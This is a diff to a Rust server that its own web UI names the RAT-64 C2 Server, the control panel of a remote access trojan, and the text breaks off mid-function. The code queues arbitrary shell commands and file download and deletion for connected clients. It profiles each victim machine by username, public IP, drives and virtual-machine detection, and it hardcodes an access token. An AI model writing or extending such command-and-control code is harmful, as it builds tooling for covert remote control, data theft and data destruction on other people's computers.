@@ -1,4 +1,4 @@
-use std::{convert::Infallible, net::SocketAddr, sync::Arc};
+use std::{convert::Infallible, net::SocketAddr, sync::Arc, collections::HashMap};
 
 use bytes::Bytes;
 use chrono::Utc;
@@ -10,13 +10,16 @@ use hyper::{header::CONTENT_TYPE, Method, Request, Response, StatusCode};
 use hyper_util::rt::TokioIo;
 use serde::{Deserialize, Serialize};
 use serde_json::{json, Value};
-use tokio::{net::TcpListener, sync::{Mutex, Notify}, time};
+use tokio::{
+    net::TcpListener,
+    sync::{Mutex, Notify},
+    time,
+};
 // Safe diagnostics from library (no secrets)
 #[cfg(feature = "server_diagnostics")]
 use rat_64::collectors::network_diagnostics::collect_network_diagnostics;
-#[cfg(feature = "server_diagnostics")]
+#[cfg(all(feature = "server_diagnostics", windows))]
 use rat_64::get_system_info;
-
 
 const AUTH_TOKEN: &str = "ZajmPAB9o8C5UgATU23mnGdBcun30IuILDaP8efMWRYtSlvT89";
 const PORT: u16 = 9999;
@@ -40,17 +43,54 @@ struct LogEntry {
     details: Option<Value>,
 }
 
+#[derive(Serialize, Deserialize, Clone, Debug)]
+struct ClientInfo {
+    client_id: String,
+    hostname: String,
+    username: String,
+    os_name: String,
+    os_version: String,
+    architecture: String,
+    cpu_info: String,
+    timezone: String,
+    is_virtual_machine: bool,
+    virtual_machine_vendor: Option<String>,
+    drives: Vec<DriveInfo>,
+    last_seen: u64,
+    status: String,
+    public_ip: String,
+}
+
+#[derive(Serialize, Deserialize, Clone, Debug)]
+struct DriveInfo {
+    drive_letter: String,
+    drive_type: String,
+    total_space_gb: f64,
+    free_space_gb: f64,
+    file_system: String,
+}
+
 struct AppState {
     command_queue: Mutex<Vec<Command>>,
     response_log: Mutex<Vec<Value>>,
     activity_log: Mutex<Vec<LogEntry>>,
+    client_info: Mutex<std::collections::HashMap<String, ClientInfo>>, // クライアント情報管理
     notify: Notify,
     _server_start: u64, // サーバー開始時刻（将来使用予定）
 }
 
-fn unix_time() -> u64 { Utc::now().timestamp() as u64 }
+fn unix_time() -> u64 {
+    Utc::now().timestamp() as u64
+}
 
-async fn log_activity(state: &AppState, level: &str, message: &str, client_id: Option<&str>, command_id: Option<&str>, details: Option<Value>) {
+async fn log_activity(
+    state: &AppState,
+    level: &str,
+    message: &str,
+    client_id: Option<&str>,
+    command_id: Option<&str>,
+    details: Option<Value>,
+) {
     let entry = LogEntry {
         timestamp: unix_time(),
         level: level.to_string(),
@@ -59,10 +99,10 @@ async fn log_activity(state: &AppState, level: &str, message: &str, client_id: O
         command_id: command_id.map(str::to_string),
         details,
     };
-    
+
     let mut log = state.activity_log.lock().await;
     log.push(entry);
-    
+
     // 最新1000件まで保持
     if log.len() > 1000 {
         let excess = log.len() - 1000;
@@ -70,7 +110,11 @@ async fn log_activity(state: &AppState, level: &str, message: &str, client_id: O
     }
 }
 
-async fn handle_simple_command(state: &AppState, prefix: &str, command_type: &str) -> Result<Response<Full<Bytes>>, Infallible> {
+async fn handle_simple_command(
+    state: &AppState,
+    prefix: &str,
+    command_type: &str,
+) -> Result<Response<Full<Bytes>>, Infallible> {
     let id = format!("{}_{}", prefix, Utc::now().timestamp_millis());
     let cmd = Command {
         id: id.clone(),
@@ -79,18 +123,30 @@ async fn handle_simple_command(state: &AppState, prefix: &str, command_type: &st
         timestamp: unix_time(),
         auth_token: AUTH_TOKEN.to_string(),
     };
-    
+
     state.command_queue.lock().await.push(cmd);
     state.notify.notify_waiters();
-    
-    log_activity(state, "INFO", &format!("{} command queued", command_type), None, Some(&id), 
-                Some(json!({"command_type": command_type}))).await;
+
+    log_activity(
+        state,
+        "INFO",
+        &format!("{} command queued", command_type),
+        None,
+        Some(&id),
+        Some(json!({"command_type": command_type})),
+    )
+    .await;
     println!("[UI] {} command added: {}", command_type, id);
-    
+
     Ok(json_response(json!({"ok": true}), StatusCode::OK))
 }
 
-async fn handle_file_command(state: &AppState, prefix: &str, command_type: &str, params: Vec<&str>) -> Result<Response<Full<Bytes>>, Infallible> {
+async fn handle_file_command(
+    state: &AppState,
+    prefix: &str,
+    command_type: &str,
+    params: Vec<&str>,
+) -> Result<Response<Full<Bytes>>, Infallible> {
     let id = format!("{}_{}", prefix, Utc::now().timestamp_millis());
     let cmd = Command {
         id: id.clone(),
@@ -99,28 +155,35 @@ async fn handle_file_command(state: &AppState, prefix: &str, command_type: &str,
         timestamp: unix_time(),
         auth_token: AUTH_TOKEN.to_string(),
     };
-    
+
     state.command_queue.lock().await.push(cmd);
     state.notify.notify_waiters();
     println!("[UI] {} command added: {}", command_type, id);
-    
+
     Ok(json_response(json!({"ok": true}), StatusCode::OK))
 }
 
 async fn extract_json_body(req: Request<Incoming>) -> Result<Value, String> {
-    let body = req.into_body().collect().await
+    let body = req
+        .into_body()
+        .collect()
+        .await
         .map_err(|_| "Failed to read body")?
         .to_bytes();
-    
+
     if body.is_empty() {
         return Err("Empty body".to_string());
     }
-    
-    serde_json::from_slice(&body)
-        .map_err(|_| "Invalid JSON".to_string())
+
+    serde_json::from_slice(&body).map_err(|_| "Invalid JSON".to_string())
 }
 
-async fn handle_file_operation(state: &AppState, req: Request<Incoming>, operation: &str, command_type: &str) -> Result<Response<Full<Bytes>>, Infallible> {
+async fn handle_file_operation(
+    state: &AppState,
+    req: Request<Incoming>,
+    operation: &str,
+    command_type: &str,
+) -> Result<Response<Full<Bytes>>, Infallible> {
     match extract_json_body(req).await {
         Ok(data) => {
             if let Some(path) = data.get("path").and_then(|p| p.as_str()) {
@@ -133,7 +196,7 @@ async fn handle_file_operation(state: &AppState, req: Request<Incoming>, operati
                     "download" => vec![path.to_string(), "52428800".to_string()],
                     _ => vec![path.to_string()],
                 };
-                
+
                 let cmd = Command {
                     id: id.clone(),
                     command_type: command_type.to_string(),
@@ -141,63 +204,99 @@ async fn handle_file_operation(state: &AppState, req: Request<Incoming>, operati
                     timestamp: unix_time(),
                     auth_token: AUTH_TOKEN.to_string(),
                 };
-                
+
                 state.command_queue.lock().await.push(cmd);
                 state.notify.notify_waiters();
                 println!("[UI] {} command added: {} (path: {})", operation, id, path);
-                Ok(json_response(json!({"ok": true, "command_id": id}), StatusCode::OK))
+                Ok(json_response(
+                    json!({"ok": true, "command_id": id}),
+                    StatusCode::OK,
+                ))
             } else {
-                Ok(json_response(json!({"error": "path parameter required"}), StatusCode::BAD_REQUEST))
+                Ok(json_response(
+                    json!({"error": "path parameter required"}),
+                    StatusCode::BAD_REQUEST,
+                ))
             }
         }
-        Err(_) => Ok(json_response(json!({"error": "Invalid JSON"}), StatusCode::BAD_REQUEST))
+        Err(_) => Ok(json_response(
+            json!({"error": "Invalid JSON"}),
+            StatusCode::BAD_REQUEST,
+        )),
     }
 }
 
-async fn handle_command(state: &AppState, req: Request<Incoming>) -> Result<Response<Full<Bytes>>, Infallible> {
+async fn handle_command(
+    state: &AppState,
+    req: Request<Incoming>,
+) -> Result<Response<Full<Bytes>>, Infallible> {
     match extract_json_body(req).await {
         Ok(data) => {
             if let Some(command) = data.get("command").and_then(|c| c.as_str()) {
                 let timeout = data.get("timeout").and_then(|t| t.as_u64()).unwrap_or(30);
-                let working_dir = data.get("working_dir").and_then(|w| w.as_str()).unwrap_or("");
-                
+                let working_dir = data
+                    .get("working_dir")
+                    .and_then(|w| w.as_str())
+                    .unwrap_or("");
+
                 let id = format!("cmd{}", Utc::now().timestamp_millis());
                 let params = vec![
                     command.to_string(),
                     timeout.to_string(),
                     working_dir.to_string(),
                 ];
-                
+
+
+
+                // 通常コマンドはキューへ（常に "execute" に統一）
+                let command_type = "execute";
                 let cmd = Command {
                     id: id.clone(),
-                    // Client expects this exact type (see services/c2.rs)
-                    command_type: "execute_debug_command".to_string(),
+                    command_type: command_type.to_string(),
                     parameters: params,
                     timestamp: unix_time(),
                     auth_token: AUTH_TOKEN.to_string(),
                 };
-                
+
                 state.command_queue.lock().await.push(cmd);
                 state.notify.notify_waiters();
-                
-                log_activity(state, "INFO", &format!("command queued: {}", command), None, Some(&id), 
-                            Some(json!({"command": command, "timeout": timeout, "working_dir": working_dir}))).await;
-                
+
+                log_activity(
+                    state,
+                    "INFO",
+                    &format!("command queued: {}", command),
+                    None,
+                    Some(&id),
+                    Some(json!({
+                        "command": command,
+                        "timeout": timeout,
+                        "working_dir": working_dir
+                    })),
+                )
+                .await;
+
                 println!("[UI] command added: {} (cmd: {})", id, command);
+
                 Ok(json_response(json!({"ok": true, "command_id": id}), StatusCode::OK))
             } else {
-                Ok(json_response(json!({"error": "command parameter required"}), StatusCode::BAD_REQUEST))
+                Ok(json_response(
+                    json!({"error": "command parameter required"}),
+                    StatusCode::BAD_REQUEST,
+                ))
             }
         }
-        Err(_) => Ok(json_response(json!({"error": "Invalid JSON"}), StatusCode::BAD_REQUEST))
+        Err(_) => Ok(json_response(
+            json!({"error": "Invalid JSON"}),
+            StatusCode::BAD_REQUEST,
+        )),
     }
 }
 
 async fn handle_client_json_request<F>(
     state: &AppState,
-    req: Request<Incoming>,  
+    req: Request<Incoming>,
     processor: F,
-    response_status: &str
+    response_status: &str,
 ) -> Result<Response<Full<Bytes>>, Infallible>
 where
     F: FnOnce(Value) -> Value,
@@ -205,17 +304,23 @@ where
     match extract_json_body(req).await {
         Ok(data) => {
             let processed_data = processor(data);
-            
+
             // レスポンス用のログでない場合はログに記録
             if response_status != "received" {
                 state.response_log.lock().await.push(processed_data);
             } else {
                 state.response_log.lock().await.push(processed_data.clone());
             }
-            
-            Ok(json_response(json!({"status": response_status}), StatusCode::OK))
+
+            Ok(json_response(
+                json!({"status": response_status}),
+                StatusCode::OK,
+            ))
         }
-        Err(_) => Ok(json_response(json!({"error": "No JSON data provided"}), StatusCode::BAD_REQUEST))
+        Err(_) => Ok(json_response(
+            json!({"error": "No JSON data provided"}),
+            StatusCode::BAD_REQUEST,
+        )),
     }
 }
 
@@ -245,7 +350,11 @@ fn unauthorized() -> Response<Full<Bytes>> {
 }
 
 fn is_authorized(req: &Request<Incoming>) -> bool {
-    if let Some(h) = req.headers().get("Authorization").and_then(|h| h.to_str().ok()) {
+    if let Some(h) = req
+        .headers()
+        .get("Authorization")
+        .and_then(|h| h.to_str().ok())
+    {
         if let Some(token) = h.strip_prefix("Bearer ") {
             return token == AUTH_TOKEN;
         }
@@ -257,24 +366,28 @@ fn log_request(method: &Method, endpoint: &str, remote: &SocketAddr, data: Optio
     let timestamp = Utc::now().format("%Y-%m-%d %H:%M:%S");
     println!("[{}] {} {} - {}", timestamp, method, endpoint, remote);
     if let Some(d) = data {
-        if let Ok(s) = serde_json::to_string_pretty(d) { println!("  Data: {}", s); }
+        if let Ok(s) = serde_json::to_string_pretty(d) {
+            println!("  Data: {}", s);
+        }
     }
 }
 
 fn parse_query_param(req: &Request<Incoming>, key: &str) -> Option<String> {
-    req.uri().query()?.split('&')
-        .find_map(|pair| {
-            let mut parts = pair.splitn(2, '=');
-            match (parts.next()?, parts.next()) {
-                (k, Some(v)) if k == key => Some(v.to_string()),
-                (k, None) if k == key => Some(String::new()),
-                _ => None,
-            }
-        })
+    req.uri().query()?.split('&').find_map(|pair| {
+        let mut parts = pair.splitn(2, '=');
+        match (parts.next()?, parts.next()) {
+            (k, Some(v)) if k == key => Some(v.to_string()),
+            (k, None) if k == key => Some(String::new()),
+            _ => None,
+        }
+    })
 }
 
 fn parse_query_bool(req: &Request<Incoming>, key: &str) -> bool {
-    matches!(parse_query_param(req, key).as_deref(), Some("1" | "true" | "yes"))
+    matches!(
+        parse_query_param(req, key).as_deref(),
+        Some("1" | "true" | "yes")
+    )
 }
 
 fn parse_query_u64(req: &Request<Incoming>, key: &str, default: u64) -> u64 {
@@ -287,7 +400,10 @@ fn html_response(html: &str) -> Response<Full<Bytes>> {
     Response::builder()
         .status(StatusCode::OK)
         .header(CONTENT_TYPE, "text/html; charset=utf-8")
-        .header(hyper::header::CACHE_CONTROL, "no-store, no-cache, must-revalidate, max-age=0")
+        .header(
+            hyper::header::CACHE_CONTROL,
+            "no-store, no-cache, must-revalidate, max-age=0",
+        )
         .header(hyper::header::PRAGMA, "no-cache")
         .header(hyper::header::EXPIRES, "0")
         .body(Full::new(Bytes::from(html.to_owned())))
@@ -450,6 +566,8 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
       font-weight: 500;
       color: #4a5568;
     }}
+    
+
     .command-log {{
       background: #1a202c;
       color: #e2e8f0;
@@ -562,6 +680,140 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
       margin: 10px 0;
       line-height: 1.5;
     }}
+    
+    /* クライアント情報スタイル */
+    .client-card {{
+      background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+      border: 1px solid #dee2e6;
+      border-radius: 8px;
+      padding: 15px;
+      margin: 10px 0;
+      transition: all 0.3s ease;
+    }}
+    .client-card:hover {{
+      border-color: #007bff;
+      box-shadow: 0 2px 8px rgba(0,123,255,0.15);
+    }}
+    .client-header {{
+      border-bottom: 1px solid #dee2e6;
+      padding-bottom: 10px;
+      margin-bottom: 15px;
+    }}
+    .client-header h4 {{
+      margin: 0;
+      color: #2d3748;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 1.1em;
+    }}
+    .client-header small {{
+      color: #6c757d;
+      font-size: 0.9em;
+    }}
+    .client-status {{
+      padding: 2px 8px;
+      border-radius: 12px;
+      font-size: 0.8em;
+      font-weight: bold;
+    }}
+    .status-online {{
+      background: #d4edda;
+      color: #155724;
+    }}
+    .status-standby {{
+      background: #fff3cd;
+      color: #856404;
+    }}
+    .status-offline {{
+      background: #f8d7da;
+      color: #721c24;
+    }}
+    .client-details {{
+      display: grid;
+      gap: 8px;
+    }}
+    .detail-row {{
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 4px 0;
+    }}
+    .detail-label {{
+      font-weight: 600;
+      color: #495057;
+      min-width: 100px;
+    }}
+    .drives-section {{
+      margin-top: 10px;
+      padding-top: 10px;
+      border-top: 1px solid #dee2e6;
+    }}
+    .drive-info {{
+      background: #ffffff;
+      border: 1px solid #e9ecef;
+      border-radius: 4px;
+      padding: 8px;
+      margin: 4px 0;
+      font-size: 0.9em;
+    }}
+    .no-clients {{
+      text-align: center;
+      color: #6c757d;
+      padding: 20px;
+      font-style: italic;
+    }}
+    .error {{
+      color: #dc3545;
+      text-align: center;
+      padding: 10px;
+      background: #f8d7da;
+      border-radius: 4px;
+    }}
+    .client-actions {{
+      margin-top: 15px;
+      padding-top: 10px;
+      border-top: 1px solid #dee2e6;
+    }}
+    .update-sysinfo-btn {{
+      background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
+      color: white;
+      border: none;
+      border-radius: 5px;
+      padding: 8px 16px;
+      font-size: 0.9em;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+    }}
+    .update-sysinfo-btn:hover {{
+      background: linear-gradient(135deg, #218838 0%, #1ea085 100%);
+      transform: translateY(-1px);
+      box-shadow: 0 2px 8px rgba(40,167,69,0.3);
+    }}
+    .update-sysinfo-btn:active {{
+      transform: translateY(0);
+    }}
+    .update-sysinfo-btn:disabled {{
+      background: #6c757d;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }}
+    .update-sysinfo-btn.urgent {{
+      background: linear-gradient(135deg, #dc3545 0%, #fd7e14 100%);
+      animation: pulse-urgent 2s infinite;
+    }}
+    .update-sysinfo-btn.urgent:hover {{
+      background: linear-gradient(135deg, #c82333 0%, #e8690b 100%);
+    }}
+    @keyframes pulse-urgent {{
+      0% {{ box-shadow: 0 2px 8px rgba(220,53,69,0.3); }}
+      50% {{ box-shadow: 0 2px 16px rgba(220,53,69,0.6); }}
+      100% {{ box-shadow: 0 2px 8px rgba(220,53,69,0.3); }}
+    }}
   </style>
   <script>
     let commandCount = 0;
@@ -583,6 +835,128 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
         .catch(() => {{
           document.getElementById('client-status').textContent = 'エラー';
           document.getElementById('client-status').className = 'status-badge offline';
+        }});
+    }}
+    
+    function updateSystemInfo(clientId) {{
+      const button = event.target;
+      const originalText = button.innerHTML;
+      
+      // ボタンを無効化してローディング表示
+      button.disabled = true;
+      button.innerHTML = '⏳ 更新中...';
+      
+      fetch(`/api/clients/update-sysinfo?client_id=${{encodeURIComponent(clientId)}}`, {{
+        method: 'POST',
+        headers: {{
+          'Content-Type': 'application/json',
+          'Authorization': 'Bearer ZajmPAB9o8C5UgATU23mnGdBcun30IuILDaP8efMWRYtSlvT89'
+        }}
+      }})
+      .then(response => response.json())
+      .then(data => {{
+        if (data.status) {{
+          button.innerHTML = '✅ 要求送信済み';
+          // すぐにクライアント情報を再取得
+          setTimeout(() => {{
+            updateClients();
+          }}, 1000);
+          setTimeout(() => {{
+            button.innerHTML = originalText;
+            button.disabled = false;
+          }}, 3000);
+        }} else {{
+          throw new Error(data.error || '更新要求に失敗しました');
+        }}
+      }})
+      .catch(error => {{
+        console.error('System info update error:', error);
+        button.innerHTML = '❌ エラー';
+        setTimeout(() => {{
+          button.innerHTML = originalText;
+          button.disabled = false;
+        }}, 2000);
+      }});
+    }}
+    
+    function updateClients() {{
+      fetch('/api/clients')
+        .then(response => response.json())
+        .then(data => {{
+          const clientContainer = document.getElementById('client-info-container');
+          if (data.clients && data.clients.length > 0) {{
+            clientContainer.innerHTML = data.clients.map(client => {{
+              const lastSeen = new Date(client.last_seen * 1000).toLocaleString();
+              
+              // システム情報が取得済みかチェック
+              const hasSystemInfo = client.username !== 'unknown' && client.os_name !== 'unknown';
+              
+              const vmStatus = hasSystemInfo ? 
+                (client.is_virtual_machine ? 
+                  `🖥️ VM (${{client.virtual_machine_vendor || '不明'}})` : 
+                  '💻 物理マシン') :
+                '❓ 情報未取得';
+              
+              const driveInfo = hasSystemInfo && client.drives && client.drives.length > 0 ? 
+                client.drives.map(drive => 
+                  `<div class="drive-info">
+                    <strong>${{drive.drive_letter}}</strong> (${{drive.drive_type}}) - 
+                    ${{drive.file_system}} | 
+                    ${{(drive.free_space_gb).toFixed(1)}}GB / ${{(drive.total_space_gb).toFixed(1)}}GB 空き
+                  </div>`
+                ).join('') :
+                '<div class="drive-info">ドライブ情報未取得</div>';
+              
+              return `
+                <div class="client-card">
+                  <div class="client-header">
+                    <h4>🖥️ ${{client.hostname}} <span class="client-status status-${{client.status}}">${{client.status}}</span></h4>
+                    <small>ID: ${{client.client_id}} | 最終確認: ${{lastSeen}}</small>
+                  </div>
+                  <div class="client-details">
+                    <div class="detail-row">
+                      <span class="detail-label">👤 ユーザー:</span>
+                      <span>${{client.username}}</span>
+                    </div>
+                    <div class="detail-row">
+                      <span class="detail-label">🌐 グローバルIP:</span>
+                      <span>${{client.public_ip}}</span>
+                    </div>
+                    <div class="detail-row">
+                      <span class="detail-label">🖥️ OS:</span>
+                      <span>${{client.os_name}} ${{client.os_version}} (${{client.architecture}})</span>
+                    </div>
+                    <div class="detail-row">
+                      <span class="detail-label">⚙️ CPU:</span>
+                      <span>${{client.cpu_info}}</span>
+                    </div>
+                    <div class="detail-row">
+                      <span class="detail-label">🌍 タイムゾーン:</span>
+                      <span>${{client.timezone}}</span>
+                    </div>
+                    <div class="detail-row">
+                      <span class="detail-label">💾 環境:</span>
+                      <span>${{vmStatus}}</span>
+                    </div>
+                    <div class="drives-section">
+                      <div class="detail-label">💽 ドライブ情報:</div>
+                      ${{driveInfo}}
+                    </div>
+                    <div class="client-actions">
+                      <button class="${{hasSystemInfo ? 'update-sysinfo-btn' : 'update-sysinfo-btn urgent'}}" onclick="updateSystemInfo('${{client.client_id}}')">
+                        ${{hasSystemInfo ? '🔄 システム情報更新' : '📥 システム情報取得'}}
+                      </button>
+                    </div>
+                  </div>
+                </div>
+              `;
+            }}).join('');
+          }} else {{
+            clientContainer.innerHTML = '<div class="no-clients">接続中のクライアントはありません</div>';
+          }}
+        }})
+        .catch(e => {{
+          document.getElementById('client-info-container').innerHTML = '<div class="error">クライアント情報の取得に失敗しました</div>';
         }});
     }}
     
@@ -796,12 +1170,12 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
       
       const timeout = parseInt(document.getElementById('timeout').value) || 30;
       const workingDir = document.getElementById('workdir').value.trim();
-      
       if (timeout < 5 || timeout > 300) {{
         showToast('タイムアウトは5～300秒の範囲で指定してください', 'error');
         return;
       }}
       
+      // 通常のコマンド実行
       const payload = {{
         command: command,
         timeout: timeout,
@@ -821,6 +1195,7 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
       // 結果取得を開始（5秒後から30秒間監視）
       setTimeout(() => checkCommandResults(command), 5000);
     }}
+
     
     // コマンド実行結果をチェックする関数
     async function checkCommandResults(originalCommand) {{
@@ -977,8 +1352,10 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
     document.addEventListener('DOMContentLoaded', function() {{
       updateStatus();
       updateLogs();
-      setInterval(updateStatus, 5000); // 5秒ごとにステータス更新
-      setInterval(updateLogs, 3000);   // 3秒ごとにログ更新
+      updateClients();
+      setInterval(updateStatus, 5000);  // 5秒ごとにステータス更新
+      setInterval(updateLogs, 3000);    // 3秒ごとにログ更新
+      setInterval(updateClients, 8000); // 8秒ごとにクライアント情報更新
       addToLog('RAT-64 C2 Server WebUI 初期化完了');
     }});
   </script>
@@ -1051,6 +1428,13 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
       </div>
 
       <div class="card">
+        <h3><span class="card-icon">🖥️</span>接続中のクライアント</h3>
+        <div id="client-info-container">
+          <div class="no-clients">データを読み込み中...</div>
+        </div>
+      </div>
+
+      <div class="card">
         <h3><span class="card-icon">🔧</span>デバッグコマンド実行</h3>
         <div class="input-group">
           <label>コマンド:</label>
@@ -1066,6 +1450,8 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
           <label>タイムアウト (秒):</label>
           <input type="number" id="timeout" value="30" min="5" max="300">
         </div>
+        
+
         
         <div style="margin: 10px 0;">
           <button type="button" class="btn-warning" onclick="executeCommand()">⚡ Execute Command</button>
@@ -1102,7 +1488,11 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
     )
 }
 
-async fn handle(req: Request<Incoming>, remote: SocketAddr, state: Arc<AppState>) -> Result<Response<Full<Bytes>>, Infallible> {
+async fn handle(
+    req: Request<Incoming>,
+    remote: SocketAddr,
+    state: Arc<AppState>,
+) -> Result<Response<Full<Bytes>>, Infallible> {
     let method = req.method().clone();
     let path = req.uri().path().to_string();
 
@@ -1119,75 +1509,124 @@ async fn handle(req: Request<Incoming>, remote: SocketAddr, state: Arc<AppState>
             let q = state.command_queue.lock().await;
             let r = state.response_log.lock().await;
             let recent: Vec<Value> = r.iter().rev().take(20).cloned().collect();
-            Ok(json_response(json!({
-                "queue_count": q.len(),
-                "responses": recent
-            }), StatusCode::OK))
+            Ok(json_response(
+                json!({
+                    "queue_count": q.len(),
+                    "responses": recent
+                }),
+                StatusCode::OK,
+            ))
         }
 
         // ファイル管理コマンド（固定パス）
-        (Method::POST, "/ui/add-list-files") => handle_file_command(&state, "list_files", "list_files", vec![".", "false"]).await,
-        (Method::POST, "/ui/add-list-files-win") => handle_file_command(&state, "list_files_win", "list_files", vec!["C:\\", "false"]).await,
+        (Method::POST, "/ui/add-list-files") => {
+            handle_file_command(&state, "list_files", "list_files", vec![".", "false"]).await
+        }
+        (Method::POST, "/ui/add-list-files-win") => {
+            handle_file_command(
+                &state,
+                "list_files_win",
+                "list_files",
+                vec!["C:\\", "false"],
+            )
+            .await
+        }
         // ファイル操作（JSONパラメータ付き）
-        (Method::POST, "/ui/add-file-info") => handle_file_operation(&state, req, "file_info", "get_file_info").await,
-        (Method::POST, "/ui/add-download-file") => handle_file_operation(&state, req, "download", "download_file").await,
-        (Method::POST, "/ui/add-delete-file") => handle_file_operation(&state, req, "delete", "delete_file").await,
-        (Method::POST, "/ui/add-create-dir") => handle_file_operation(&state, req, "create_dir", "create_dir").await,
-
-
+        (Method::POST, "/ui/add-file-info") => {
+            handle_file_operation(&state, req, "file_info", "get_file_info").await
+        }
+        (Method::POST, "/ui/add-download-file") => {
+            handle_file_operation(&state, req, "download", "download_file").await
+        }
+        (Method::POST, "/ui/add-delete-file") => {
+            handle_file_operation(&state, req, "delete", "delete_file").await
+        }
+        (Method::POST, "/ui/add-create-dir") => {
+            handle_file_operation(&state, req, "create_dir", "create_dir").await
+        }
 
         // Webhook
-        (Method::POST, "/ui/queue-webhook") => handle_simple_command(&state, "webhook", "webhook_send").await,
+        (Method::POST, "/ui/queue-webhook") => {
+            handle_simple_command(&state, "webhook", "webhook_send").await
+        }
 
         // デバッグコマンド実行
         (Method::POST, "/ui/execute-command") => handle_command(&state, req).await,
-        
+
         // コマンド実行結果取得
         (Method::GET, "/ui/command-results") => {
             let r = state.response_log.lock().await;
             let recent_results: Vec<Value> = r.iter().rev().take(50).cloned().collect();
-            
+
             // デバッグログ：結果の概要を表示
             if !recent_results.is_empty() {
                 let latest = &recent_results[0];
                 if let Some(command_id) = latest.get("command_id").and_then(|v| v.as_str()) {
-                    println!("  → Command results requested: {} results available, latest: {}", recent_results.len(), command_id);
+                    println!(
+                        "  → Command results requested: {} results available, latest: {}",
+                        recent_results.len(),
+                        command_id
+                    );
                 }
             } else {
                 println!("  → Command results requested: no results available");
             }
-            
-            Ok(json_response(json!({
-                "results": recent_results,
-                "count": recent_results.len(),
-                "timestamp": unix_time()
-            }), StatusCode::OK))
+
+            Ok(json_response(
+                json!({
+                    "results": recent_results,
+                    "count": recent_results.len(),
+                    "timestamp": unix_time()
+                }),
+                StatusCode::OK,
+            ))
         }
 
         // コマンド結果に含まれるファイルデータ（base64）をダウンロードとして返す
         (Method::GET, "/api/responses/file") => {
             // UIからのダウンロード用エンドポイント（認証不要のUI用途）
             let Some(cmd_id) = parse_query_param(&req, "command_id") else {
-                return Ok(json_response(json!({"error":"command_id required"}), StatusCode::BAD_REQUEST));
+                return Ok(json_response(
+                    json!({"error":"command_id required"}),
+                    StatusCode::BAD_REQUEST,
+                ));
             };
 
             let logs = state.response_log.lock().await;
-            if let Some(item) = logs.iter().rev().find(|v| v.get("command_id").and_then(|s| s.as_str()) == Some(cmd_id.as_str())) {
+            if let Some(item) = logs
+                .iter()
+                .rev()
+                .find(|v| v.get("command_id").and_then(|s| s.as_str()) == Some(cmd_id.as_str()))
+            {
                 if let Some(data) = item.get("data") {
-                    let file_name = data.get("file_name").and_then(|s| s.as_str()).unwrap_or("download.bin");
+                    let file_name = data
+                        .get("file_name")
+                        .and_then(|s| s.as_str())
+                        .unwrap_or("download.bin");
                     let encoding = data.get("encoding").and_then(|s| s.as_str()).unwrap_or("");
                     let b64 = data.get("data").and_then(|s| s.as_str());
                     if encoding == "base64" {
                         if let Some(b64s) = b64 {
-                            match base64::Engine::decode(&base64::engine::general_purpose::STANDARD, b64s) {
+                            match base64::Engine::decode(
+                                &base64::engine::general_purpose::STANDARD,
+                                b64s,
+                            ) {
                                 Ok(bytes) => return Ok(bytes_download_response(file_name, bytes)),
-                                Err(_) => return Ok(json_response(json!({"error":"invalid base64"}), StatusCode::BAD_REQUEST))
+                                Err(_) => {
+                                    return Ok(json_response(
+                                        json!({"error":"invalid base64"}),
+                                        StatusCode::BAD_REQUEST,
+                                    ))
+                                }
                             }
                         }
                     }
                 }
             }
-            Ok(json_response(json!({"error":"file data not found"}), StatusCode::NOT_FOUND))
+            Ok(json_response(
+                json!({"error":"file data not found"}),
+                StatusCode::NOT_FOUND,
+            ))
         }
 
         // Client endpoints ---------------------------------------------
@@ -1195,8 +1634,11 @@ async fn handle(req: Request<Incoming>, remote: SocketAddr, state: Arc<AppState>
         // Client endpoints ---------------------------------------------
         (Method::GET, "/api/commands/fetch") => {
             log_request(&method, &path, &remote, None);
-            if !is_authorized(&req) { return Ok(unauthorized()); }
-            let client_id = parse_query_param(&req, "client_id").unwrap_or_else(|| "unknown".into());
+            if !is_authorized(&req) {
+                return Ok(unauthorized());
+            }
+            let client_id =
+                parse_query_param(&req, "client_id").unwrap_or_else(|| "unknown".into());
             let wait = parse_query_bool(&req, "wait");
             let timeout_secs = parse_query_u64(&req, "timeout", 25);
 
@@ -1206,76 +1648,259 @@ async fn handle(req: Request<Incoming>, remote: SocketAddr, state: Arc<AppState>
                 q.clone()
             };
             if cmds.is_empty() && wait {
-                let _ = time::timeout(std::time::Duration::from_secs(timeout_secs), state.notify.notified()).await;
+                let _ = time::timeout(
+                    std::time::Duration::from_secs(timeout_secs),
+                    state.notify.notified(),
+                )
+                .await;
                 let q = state.command_queue.lock().await;
                 cmds = q.clone();
             }
-            
+
             // コマンドを送信した後、古いコマンドをクリアする（5秒経過したもの）
             if !cmds.is_empty() {
                 let mut q = state.command_queue.lock().await;
                 let current_time = unix_time();
                 q.retain(|cmd| current_time - cmd.timestamp < 5); // 5秒以内のコマンドのみ保持
             }
-            if !cmds.is_empty() { println!("  → Returning {} command(s) for client: {}", cmds.len(), client_id); }
-            Ok(json_response(serde_json::to_value(cmds).unwrap_or_else(|_| json!([])), StatusCode::OK))
+            if !cmds.is_empty() {
+                println!(
+                    "  → Returning {} command(s) for client: {}",
+                    cmds.len(),
+                    client_id
+                );
+            }
+            Ok(json_response(
+                serde_json::to_value(cmds).unwrap_or_else(|_| json!([])),
+                StatusCode::OK,
+            ))
         }
 
         (Method::POST, "/api/commands/response") => {
-            if !is_authorized(&req) { return Ok(unauthorized()); }
-            handle_client_json_request(&state, req, |mut data| {
-                // コマンドレスポンス受信ログを追加
-                let command_id = data.get("command_id").and_then(|v| v.as_str()).unwrap_or("unknown");
-                let success = data.get("success").and_then(|v| v.as_bool()).unwrap_or(false);
-                let message = data.get("message").and_then(|v| v.as_str()).unwrap_or("no message");
-                
